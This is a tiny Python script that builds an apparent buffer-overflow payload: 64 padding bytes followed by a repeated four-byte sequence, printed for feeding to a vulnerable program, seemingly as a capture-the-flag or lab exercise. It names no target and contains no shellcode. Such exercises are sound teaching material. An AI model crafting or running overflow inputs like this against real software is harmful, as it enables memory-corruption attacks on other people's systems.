payload=bytearray()

for i in range(64):
	payload.append('\x5e')

payload.append('\x05')
payload.append('\x03')
payload.append('\x02')
payload.append('\x01')
payload.append('\x05')
payload.append('\x03')
payload.append('\x02')
payload.append('\x01')
payload.append('\x05')
payload.append('\x03')
payload.append('\x02')
payload.append('\x01')
payload.append('\x05')
payload.append('\x03')
payload.append('\x02')
payload.append('\x01')
payload.append('\x05')
payload.append('\x03')
payload.append('\x02')
payload.append('\x01')

print(payload)
